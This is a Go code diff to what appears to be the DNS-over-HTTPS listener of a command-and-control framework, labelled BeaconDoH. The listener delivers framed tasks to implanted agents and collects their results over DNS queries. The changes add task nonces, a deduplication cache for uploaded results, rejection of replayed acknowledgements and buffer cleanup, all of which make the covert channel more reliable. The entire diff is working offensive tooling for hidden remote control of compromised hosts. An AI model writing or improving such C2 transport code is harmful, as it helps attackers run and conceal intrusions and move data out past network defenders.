@@ -37,9 +37,16 @@ type dohFragBuf struct {
 }
 
 type dohDownBuf struct {
-	total uint32
-	off   uint32
-	buf   []byte
+	total     uint32
+	off       uint32
+	buf       []byte
+	taskNonce uint32 // unique identifier for this task batch
+}
+
+// dohUpDone tracks recently submitted results for deduplication
+type dohUpDone struct {
+	total  uint32
+	doneAt time.Time
 }
 
 const metaV1Size = 8
@@ -77,10 +84,11 @@ type DoHListener struct {
 	tcpServer *dns.Server
 	ts        Teamserver
 
-	mu        sync.Mutex
-	upFrags   map[string]*dohFragBuf
-	downFrags map[string]*dohDownBuf
-	rng       *rand.Rand
+	mu          sync.Mutex
+	upFrags     map[string]*dohFragBuf
+	downFrags   map[string]*dohDownBuf
+	upDoneCache map[string]*dohUpDone // dedup window for submitted results
+	rng         *rand.Rand
 }
 
 func (d *DoHListener) Start(ts Teamserver) error {
@@ -96,6 +104,7 @@ func (d *DoHListener) Start(ts Teamserver) error {
 
 	d.upFrags = make(map[string]*dohFragBuf)
 	d.downFrags = make(map[string]*dohDownBuf)
+	d.upDoneCache = make(map[string]*dohUpDone)
 
 	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))
 
@@ -143,8 +152,10 @@ func (d *DoHListener) cleanupStaleFragments() {
 
 		now := time.Now()
 		staleTimeout := 5 * time.Minute // Fragments older than 5 minutes are considered stale
+		dedupTimeout := 5 * time.Minute // Dedup cache entries expire after 5 minutes
 
 		d.mu.Lock()
+		// Cleanup stale upload fragments
 		for sid, fb := range d.upFrags {
 			if now.Sub(fb.lastUpdate) > staleTimeout {
 				if dohDebug {
@@ -153,6 +164,26 @@ func (d *DoHListener) cleanupStaleFragments() {
 				}
 				delete(d.upFrags, sid)
 			}
+		}
+		// Cleanup expired dedup cache entries
+		for sid, done := range d.upDoneCache {
+			if now.Sub(done.doneAt) > dedupTimeout {
+				if dohDebug {
+					fmt.Printf("[BeaconDoH-DNS] [CLEANUP] Removing dedup cache entry | sid=%s | total=%d | age=%v\n",
+						sid, done.total, now.Sub(done.doneAt))
+				}
+				delete(d.upDoneCache, sid)
+			}
+		}
+		// Cleanup stale download buffers (tasks that were never fully delivered)
+		// Note: downFrags don't have lastUpdate, so we just count how many there are
+		if len(d.downFrags) > 100 {
+			// Too many download buffers, something is wrong, clear old ones
+			// This is a fallback; normally ACK mechanism should clean them up
+			if dohDebug {
+				fmt.Printf("[BeaconDoH-DNS] [CLEANUP] Too many downFrags (%d), clearing all\n", len(d.downFrags))
+			}
+			d.downFrags = make(map[string]*dohDownBuf)
 		}
 		d.mu.Unlock()
 	}
@@ -234,6 +265,14 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 	d.mu.Lock()
 	defer d.mu.Unlock()
 
+	// Check dedup cache: if we already submitted a result with same total, ignore
+	if done, exists := d.upDoneCache[key]; exists && done.total == total {
+		if dohDebug {
+			fmt.Printf("[BeaconDoH-DNS] [UP] DEDUP: result already submitted | sid=%s total=%d\n", sid, total)
+		}
+		return
+	}
+
 	fb, ok := d.upFrags[key]
 	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
 		// 新一轮上行会话：
@@ -310,6 +349,12 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 				sid, fb.total, fb.filled, fb.highWater, len(fb.seenOffsets))
 		}
 		_ = d.ts.TsAgentProcessData(sid, fb.buf)
+
+		// Record in dedup cache to prevent duplicate submissions
+		d.upDoneCache[key] = &dohUpDone{
+			total:  fb.total,
+			doneAt: time.Now(),
+		}
 		delete(d.upFrags, key)
 	}
 }
@@ -537,13 +582,26 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 			if df == nil || df.off >= df.total {
+				// If old task is complete, clear it first to avoid re-sending
+				if df != nil && df.off >= df.total {
+					d.mu.Lock()
+					delete(d.downFrags, sid)
+					d.mu.Unlock()
+					df = nil
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] [GET] Cleared completed task for sid=%s\n", sid)
+					}
+				}
+
 				maxDataSize := d.Config.PktSize * 256
 				if maxDataSize <= 0 || maxDataSize > (4<<20) {
 					maxDataSize = 4 << 20
 				}
-				if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
+				if p, err := d.ts.TsAgentGetHostedAll(sid, maxDataSize); err == nil && len(p) > 0 {
+					// Generate unique taskNonce for this task batch
+					taskNonce := d.rng.Uint32()
 					if dohDebug {
-						fmt.Printf("[BeaconDoH-DNS] GET tasks sid=%s total=%d\n", sid, len(p))
+						fmt.Printf("[BeaconDoH-DNS] GET tasks sid=%s total=%d taskNonce=%08x\n", sid, len(p), taskNonce)
 					}
 					origLen := len(p)
 					flags := byte(0)
@@ -566,15 +624,22 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						}
 					}
 
-					totalLen := 1 + 4 + len(payload)
+					// Frame format: [flags:1][taskNonce:4][origLen:4][payload]
+					totalLen := 1 + 4 + 4 + len(payload)
 					buf := make([]byte, totalLen)
 					buf[0] = flags
-					buf[1] = byte(origLen & 0xFF)
-					buf[2] = byte((origLen >> 8) & 0xFF)
-					buf[3] = byte((origLen >> 16) & 0xFF)
-					buf[4] = byte((origLen >> 24) & 0xFF)
-					copy(buf[5:], payload)
-					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
+					// taskNonce (little-endian)
+					buf[1] = byte(taskNonce & 0xFF)
+					buf[2] = byte((taskNonce >> 8) & 0xFF)
+					buf[3] = byte((taskNonce >> 16) & 0xFF)
+					buf[4] = byte((taskNonce >> 24) & 0xFF)
+					// origLen (little-endian)
+					buf[5] = byte(origLen & 0xFF)
+					buf[6] = byte((origLen >> 8) & 0xFF)
+					buf[7] = byte((origLen >> 16) & 0xFF)
+					buf[8] = byte((origLen >> 24) & 0xFF)
+					copy(buf[9:], payload)
+					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf, taskNonce: taskNonce}
 					if dohDebug {
 						fmt.Printf("[BeaconDoH-DNS] [DOWN] Prepared task | sid=%s orig_len=%d flags=%d framed_len=%d\n", sid, origLen, flags, len(buf))
 					}
@@ -662,31 +727,44 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 		case "HB":
-			// Dedicated heartbeat operation (A query with ack_offset + nonce)
+			// Dedicated heartbeat operation (A query with ack_offset + nonce + ackTaskNonce)
 			if sid != "" {
 				_ = d.ts.TsAgentSetTick(sid)
 			}
 
-			// Parse [ackOffset:4][nonce:4] from dataB
+			// Parse [ackOffset:4][hbNonce:4][ackTaskNonce:4] from dataB (12 bytes total)
 			var ackOffset uint32 = 0
 			var hbNonce uint32 = 0
+			var ackTaskNonce uint32 = 0
 			if len(dataB) >= 4 {
 				ackOffset = binary.BigEndian.Uint32(dataB[0:4])
 			}
 			if len(dataB) >= 8 {
 				hbNonce = binary.BigEndian.Uint32(dataB[4:8])
 			}
+			if len(dataB) >= 12 {
+				ackTaskNonce = binary.BigEndian.Uint32(dataB[8:12])
+			}
 
 			// Check existing task and handle ACK
+			// CRITICAL: Only delete task if ackTaskNonce matches df.taskNonce
+			// This prevents DNS cache replay of old ACKs from deleting new tasks
 			d.mu.Lock()
 			df, hasDf := d.downFrags[sid]
 			if hasDf && ackOffset >= df.total && df.total > 0 {
-				// Agent confirmed receipt of entire task
-				delete(d.downFrags, sid)
-				df = nil
-				hasDf = false
-				if dohDebug {
-					fmt.Printf("[BeaconDoH-DNS] [HB] Task complete | sid=%s ack=%d nonce=%08x\n", sid, ackOffset, hbNonce)
+				// Verify ackTaskNonce matches to prevent old ACK from deleting new task
+				if ackTaskNonce == df.taskNonce {
+					// Agent confirmed receipt of entire task
+					delete(d.downFrags, sid)
+					df = nil
+					hasDf = false
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] [HB] Task complete | sid=%s ack=%d nonce=%08x taskNonce=%08x\n", sid, ackOffset, hbNonce, ackTaskNonce)
+					}
+				} else if dohDebug {
+					// ackTaskNonce mismatch: this is likely a cached old ACK, ignore
+					fmt.Printf("[BeaconDoH-DNS] [HB] IGNORE stale ACK | sid=%s ack=%d ackTaskNonce=%08x != df.taskNonce=%08x\n",
+						sid, ackOffset, ackTaskNonce, df.taskNonce)
 				}
 			}
 			d.mu.Unlock()
@@ -697,9 +775,11 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				if maxDataSize <= 0 || maxDataSize > (4<<20) {
 					maxDataSize = 4 << 20
 				}
-				if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
+				if p, err := d.ts.TsAgentGetHostedAll(sid, maxDataSize); err == nil && len(p) > 0 {
+					// Generate unique taskNonce for this task batch
+					taskNonce := d.rng.Uint32()
 					if dohDebug {
-						fmt.Printf("[BeaconDoH-DNS] [HB] New tasks for sid=%s total=%d bytes\n", sid, len(p))
+						fmt.Printf("[BeaconDoH-DNS] [HB] New tasks for sid=%s total=%d bytes taskNonce=%08x\n", sid, len(p), taskNonce)
 					}
 					origLen := len(p)
 					flags := byte(0)
@@ -722,23 +802,29 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						}
 					}
 
-					totalLen := 1 + 4 + len(payload)
+					// Frame format: [flags:1][taskNonce:4][origLen:4][payload]
+					totalLen := 1 + 4 + 4 + len(payload)
 					buf := make([]byte, totalLen)
 					buf[0] = flags
-					buf[1] = byte(origLen & 0xFF)
-					buf[2] = byte((origLen >> 8) & 0xFF)
-					buf[3] = byte((origLen >> 16) & 0xFF)
-					buf[4] = byte((origLen >> 24) & 0xFF)
-					copy(buf[5:], payload)
-					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
+					// taskNonce (little-endian)
+					buf[1] = byte(taskNonce & 0xFF)
+					buf[2] = byte((taskNonce >> 8) & 0xFF)
+					buf[3] = byte((taskNonce >> 16) & 0xFF)
+					buf[4] = byte((taskNonce >> 24) & 0xFF)
+					// origLen (little-endian)
+					buf[5] = byte(origLen & 0xFF)
+					buf[6] = byte((origLen >> 8) & 0xFF)
+					buf[7] = byte((origLen >> 16) & 0xFF)
+					buf[8] = byte((origLen >> 24) & 0xFF)
+					copy(buf[9:], payload)
+					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf, taskNonce: taskNonce}
 					if dohDebug {
 						fmt.Printf("[BeaconDoH-DNS] [HB] Prepared task | sid=%s orig=%d flags=%d framed=%d\n", sid, origLen, flags, len(buf))
 					}
 
 					d.mu.Lock()
-					if df != nil {
-						d.downFrags[sid] = df
-					}
+					d.downFrags[sid] = df
+					hasDf = true // Update hasDf since we just created a new task
 					d.mu.Unlock()
 				}
 			}
